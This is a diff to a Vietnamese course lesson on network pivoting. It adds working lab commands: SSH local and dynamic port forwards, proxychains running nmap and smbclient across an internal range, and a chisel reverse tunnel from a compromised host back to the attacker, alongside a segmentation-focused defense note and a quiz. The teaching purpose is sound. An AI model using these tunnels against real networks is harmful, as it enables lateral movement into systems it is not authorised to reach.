@@ -2,35 +2,30 @@
 title: "Pivoting và mạng nội bộ"
 code: "3.3"
 level: 3
-summary: "Dùng một máy đã chiếm được làm bàn đạp để với tới những máy không thể chạm trực tiếp."
-duration: "60 phút"
+summary: "Dùng máy đã chiếm làm bàn đạp tới vùng nội bộ, qua SSH tunnel, proxychains và chisel — có lệnh thật."
+duration: "70 phút"
 objectives:
-  - "Hiểu vì sao có những máy không chạm tới được từ bên ngoài"
-  - "Giải thích pivoting bằng khái niệm bàn đạp"
-  - "Nắm ý tưởng chung của chuyển tiếp kết nối qua máy trung gian"
+  - "Hiểu vì sao có máy không chạm tới được từ ngoài"
+  - "Dựng SSH tunnel (local, dynamic) để với tới máy nội bộ"
+  - "Dùng proxychains cho công cụ đi qua bàn đạp"
   - "Hiểu phân đoạn mạng hạn chế pivoting ra sao"
 ---
 import Callout from '../../components/ui/Callout.astro';
+import Terminal from '../../components/ui/Terminal.astro';
 import ConceptMap from '../../components/sim/ConceptMap.tsx';
 import Quiz from '../../components/sim/Quiz.tsx';
 
 ## Hình dung trước
 
-Trong một toà nhà, từ sảnh bạn không vào thẳng được kho. Nhưng nếu bạn vào được phòng làm việc tầng 2, và phòng đó có cửa thông sang kho, thì phòng tầng 2 trở thành bàn đạp. Pivoting trong mạng là đúng ý này: máy đầu tiên chiếm được trở thành điểm trung chuyển để với tới các máy sâu hơn.
+Trong một toà nhà, từ sảnh bạn không vào thẳng được kho. Nhưng nếu vào được phòng làm việc tầng 2, và phòng đó có cửa thông sang kho, thì phòng tầng 2 thành bàn đạp. Pivoting là đúng ý này: máy đầu tiên chiếm được trở thành điểm trung chuyển tới các máy sâu hơn.
 
 ## Kiến thức chính
 
 ### Vì sao cần pivoting
 
-Mạng doanh nghiệp thường chia nhiều vùng. Vùng tiếp xúc Internet (nơi đặt máy chủ web) được phép ra ngoài. Vùng nội bộ (nơi đặt máy nhân viên, cơ sở dữ liệu) thì không cho truy cập trực tiếp từ Internet. Nhớ lại ý phân đoạn mạng ở bài 1.1.
+Mạng doanh nghiệp chia nhiều vùng. Vùng tiếp xúc Internet (máy chủ web) được ra ngoài; vùng nội bộ (máy nhân viên, cơ sở dữ liệu) không cho truy cập trực tiếp từ ngoài (nhớ phân đoạn mạng, bài 1.1). Khi chiếm được máy chủ web ở vùng ngoài, bạn thường thấy nó lại nói chuyện được với máy nội bộ mà bạn không chạm trực tiếp. Pivoting dùng chính máy đó làm cầu nối.
 
-Khi bạn chiếm được máy chủ web ở vùng ngoài, bạn thường phát hiện nó lại nói chuyện được với các máy nội bộ mà bạn không chạm tới trực tiếp. Pivoting là dùng chính máy đó làm cầu nối.
-
-### Ý tưởng chuyển tiếp
-
-Máy của bạn không gửi gói tin thẳng tới máy nội bộ được. Thay vào đó, bạn ra lệnh cho máy đã chiếm (máy bàn đạp) chuyển tiếp các kết nối giúp bạn. Với máy nội bộ, kết nối trông như đến từ máy bàn đạp, một máy "quen", nên nó chấp nhận.
-
-Điều quan trọng cần hiểu ở mức khái niệm: pivoting không tạo ra quyền mới, nó chỉ mở rộng **tầm với**. Bạn vẫn cần tìm lỗ hổng và leo thang trên từng máy nội bộ như bình thường.
+Quan trọng: pivoting **không tạo quyền mới**, chỉ mở rộng **tầm với**. Bạn vẫn phải khai thác và leo thang trên từng máy nội bộ.
 
 ### Sơ đồ mạng nhiều vùng
 
@@ -44,10 +39,10 @@ Máy của bạn không gửi gói tin thẳng tới máy nội bộ được. T
     { label: 'Vùng nội bộ', x: 360, y: 110, w: 280, h: 190 },
   ]}
   nodes={[
-    { id: 'att', label: 'Máy của bạn', x: 110, y: 55, tone: 'accent', detail: 'Ở ngoài Internet. Chỉ chạm trực tiếp được vùng tiếp xúc, không chạm được vùng nội bộ.' },
-    { id: 'web', label: 'Máy chủ web', sub: 'đã chiếm', x: 170, y: 210, tone: 'warn', detail: 'Chiếm được từ Internet. Nó nằm ở vùng ngoài nhưng lại nói chuyện được với vùng nội bộ. Đây là máy bàn đạp.' },
-    { id: 'db', label: 'Cơ sở dữ liệu', x: 500, y: 165, detail: 'Chỉ nhận kết nối từ trong mạng nội bộ. Không thể chạm trực tiếp từ Internet, nhưng máy chủ web thì tới được.' },
-    { id: 'file', label: 'Máy chủ file', x: 500, y: 255, detail: 'Cũng ở vùng nội bộ. Qua bàn đạp, giờ nằm trong tầm với để liệt kê và tìm lỗ hổng.' },
+    { id: 'att', label: 'Máy của bạn', x: 110, y: 55, tone: 'accent', detail: 'Ở ngoài. Chỉ chạm trực tiếp vùng tiếp xúc, không chạm vùng nội bộ.' },
+    { id: 'web', label: 'Máy chủ web', sub: 'đã chiếm', x: 170, y: 210, tone: 'warn', detail: 'Chiếm từ Internet. Nằm vùng ngoài nhưng nói chuyện được với vùng nội bộ. Đây là bàn đạp.' },
+    { id: 'db', label: 'Cơ sở dữ liệu', x: 500, y: 165, detail: 'Chỉ nhận kết nối từ trong mạng nội bộ. Máy chủ web thì tới được.' },
+    { id: 'file', label: 'Máy chủ file', x: 500, y: 255, detail: 'Cũng ở vùng nội bộ. Qua bàn đạp, giờ nằm trong tầm với.' },
   ]}
   edges={[
     { from: 'att', to: 'web', label: 'chiếm trực tiếp' },
@@ -56,35 +51,70 @@ Máy của bạn không gửi gói tin thẳng tới máy nội bộ được. T
   ]}
 />
 
+## Thực hành: dựng đường hầm
+
+Giả sử bạn đã có SSH vào máy bàn đạp `10.10.14.30`, và từ nó thấy cơ sở dữ liệu nội bộ `172.16.0.10:3306` mà máy bạn không chạm được.
+
+**Local port forward (`-L`): kéo một cổng nội bộ về máy mình.**
+
+<Terminal title="SSH -L chuyển tiếp một cổng cụ thể">
+kali@lab:~$ ssh -L 3306:172.16.0.10:3306 jdoe@10.10.14.30
+# Giờ trên MÁY BẠN, cổng 3306 trỏ thẳng tới DB nội bộ:
+kali@lab:~$ mysql -h 127.0.0.1 -P 3306 -u root -p
+</Terminal>
+
+Đọc: "mở cổng 3306 trên máy tôi, mọi kết nối tới đó hãy chuyển qua `10.10.14.30` tới `172.16.0.10:3306`". Giờ các công cụ trên máy bạn nối vào `127.0.0.1:3306` là chạm được DB nội bộ.
+
+**Dynamic port forward (`-D`): biến bàn đạp thành proxy SOCKS cho cả mạng nội bộ.**
+
+<Terminal title="SSH -D tạo proxy SOCKS + proxychains">
+kali@lab:~$ ssh -D 9050 jdoe@10.10.14.30
+# Trong cấu hình proxychains đã có: socks5 127.0.0.1 9050
+kali@lab:~$ proxychains nmap -sT -Pn 172.16.0.0/24
+kali@lab:~$ proxychains smbclient -L //172.16.0.20
+</Terminal>
+
+`-D 9050` mở một proxy SOCKS; `proxychains` đẩy lưu lượng của bất kỳ công cụ nào qua proxy đó, nên nmap/smbclient chạy "từ" bàn đạp và với tới cả dải nội bộ.
+
+**Khi không có SSH: dùng chisel** để dựng đường hầm qua HTTP (hữu ích khi chỉ có web shell):
+
+<Terminal title="chisel khi không có SSH">
+# Trên máy bạn (server):
+kali@lab:~$ ./chisel server -p 8000 --reverse
+# Trên máy bàn đạp (client), trỏ ngược về bạn:
+C:\> chisel.exe client 10.10.14.7:8000 R:socks
+</Terminal>
+
 <Callout type="note">
-Bấm vào máy chủ web trong sơ đồ: nó là mắt xích vừa thuộc vùng ngoài vừa chạm được vùng trong. Chính vị trí "hai chân hai vùng" này khiến nó thành bàn đạp giá trị.
+Bấm vào máy chủ web trong sơ đồ: nó vừa thuộc vùng ngoài vừa chạm được vùng trong. Chính vị trí "hai chân hai vùng" khiến nó thành bàn đạp giá trị. Luôn liệt kê "máy này còn nói chuyện được với ai" ngay sau khi chiếm máy đầu tiên (xem `ip route`, `arp -a`, bài 1.1).
 </Callout>
 
 ## Góc phòng thủ
 
 <Callout type="defense">
-Phân đoạn mạng là biện pháp phòng thủ chính chống pivoting. Nếu máy chủ web chỉ được phép mở đúng những kết nối nó thật sự cần, thay vì nói chuyện tự do với cả vùng nội bộ, thì giá trị của nó khi bị chiếm sẽ nhỏ đi nhiều. Thêm vào đó: giám sát lưu lượng bất thường giữa các vùng, và áp dụng nguyên tắc tin cậy tối thiểu (không mặc định tin một máy chỉ vì nó ở trong mạng).
+Phân đoạn mạng là biện pháp chính chống pivoting: nếu máy chủ web chỉ được mở đúng các kết nối nó thật sự cần (chứ không nói chuyện tự do với cả vùng nội bộ), giá trị của nó khi bị chiếm nhỏ đi nhiều. Thêm: giám sát lưu lượng bất thường giữa các vùng, phát hiện đường hầm (kết nối SSH/HTTP dài bất thường), và áp dụng tin cậy tối thiểu (không mặc định tin một máy chỉ vì nó trong mạng).
 </Callout>
 
 ## Lỗi người mới hay gặp
 
-- Nghĩ pivoting cho thêm quyền. Nó chỉ mở rộng tầm với; vẫn phải khai thác và leo thang trên từng máy.
-- Quên liệt kê "máy này còn nói chuyện được với ai", một bước dễ bỏ sót sau khi chiếm máy đầu tiên.
-- Bỏ qua việc ghi chép sơ đồ mạng khi đi sâu, dẫn tới lạc đường trong mạng nhiều vùng.
+- Nghĩ pivoting cho thêm quyền. Nó chỉ mở rộng tầm với; vẫn phải khai thác từng máy.
+- Quên liệt kê "máy này nối được với ai" sau khi chiếm máy đầu.
+- Không vẽ lại sơ đồ mạng khi đi sâu, dẫn tới lạc trong mạng nhiều vùng.
 
 ## Kiểm tra nhanh
 
 <Quiz
   client:visible
   questions={[
-    { q: 'Pivoting về bản chất làm gì?', options: ['Tạo quyền root mới', 'Dùng máy đã chiếm làm cầu nối để với tới máy khác', 'Quét cổng nhanh hơn'], answer: 1, explain: 'Nó mở rộng tầm với qua một máy trung gian, không tạo thêm quyền.' },
-    { q: 'Vì sao máy nội bộ chấp nhận kết nối chuyển tiếp qua máy bàn đạp?', options: ['Vì kết nối trông như đến từ một máy quen trong mạng', 'Vì máy nội bộ không có bảo vệ', 'Vì pivoting phá firewall'], answer: 0, explain: 'Kết nối xuất phát từ máy bàn đạp, vốn được mạng nội bộ tin tưởng hơn một máy lạ từ Internet.' },
-    { q: 'Biện pháp phòng thủ chính chống pivoting là gì?', options: ['Đổi mật khẩu thường xuyên', 'Phân đoạn mạng và chỉ cho phép đúng kết nối cần thiết', 'Tắt máy chủ web'], answer: 1, explain: 'Hạn chế những gì mỗi máy được phép kết nối tới làm giảm giá trị của một máy bị chiếm.' },
+    { q: 'Pivoting về bản chất làm gì?', options: ['Tạo quyền root mới', 'Dùng máy đã chiếm làm cầu nối tới máy khác', 'Quét cổng nhanh hơn'], answer: 1, explain: 'Nó mở rộng tầm với qua máy trung gian, không tạo thêm quyền.' },
+    { q: '`ssh -D 9050` tạo ra gì?', options: ['Một local port forward', 'Một proxy SOCKS để proxychains đẩy công cụ qua bàn đạp', 'Một tài khoản mới'], answer: 1, explain: '-D mở proxy SOCKS động; kết hợp proxychains để mọi công cụ đi qua bàn đạp.' },
+    { q: 'Khi chỉ có web shell, không có SSH, công cụ nào hay dùng để dựng đường hầm?', options: ['chisel', 'nmap', 'hydra'], answer: 0, explain: 'chisel dựng đường hầm qua HTTP, hữu ích khi không có SSH.' },
+    { q: 'Biện pháp phòng thủ chính chống pivoting?', options: ['Đổi mật khẩu thường xuyên', 'Phân đoạn mạng, chỉ cho đúng kết nối cần thiết', 'Tắt máy chủ web'], answer: 1, explain: 'Hạn chế những gì mỗi máy được kết nối tới làm giảm giá trị một máy bị chiếm.' },
   ]}
 />
 
 ## Ghi nhớ
 
-- Pivoting dùng máy đã chiếm làm bàn đạp tới các máy không chạm trực tiếp được.
-- Nó mở rộng tầm với, không tạo quyền mới.
-- Phân đoạn mạng và tin cậy tối thiểu là cách phòng thủ cốt lõi.
+- Pivoting dùng máy đã chiếm làm bàn đạp; mở rộng tầm với, không tạo quyền mới.
+- `ssh -L` kéo một cổng về; `ssh -D` + proxychains cho cả dải; chisel khi không có SSH.
+- Phân đoạn mạng và tin cậy tối thiểu là phòng thủ cốt lõi.
